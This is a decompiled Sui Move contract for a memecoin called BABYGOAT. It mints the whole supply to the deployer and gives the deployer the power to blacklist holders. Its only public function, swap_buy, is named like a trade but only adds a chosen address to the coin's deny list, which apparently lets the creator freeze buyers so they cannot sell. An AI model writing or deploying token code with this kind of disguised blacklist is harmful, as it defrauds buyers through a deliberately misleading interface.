module 0x57972b01c73c8df9e5d1fca53df3b81a06724b4dda9506c2545fbfda71a08ec2::babygoat {
    struct BABYGOAT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BABYGOAT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BABYGOAT>(arg0, 9, b"BABYGOAT", b"Baby Goatseus Maximus", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qmd4FRyEYrr9QthjQG19G5PDkf8n2FcSYGEfgJXNTwW831"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BABYGOAT>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BABYGOAT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BABYGOAT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BABYGOAT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BABYGOAT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BABYGOAT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

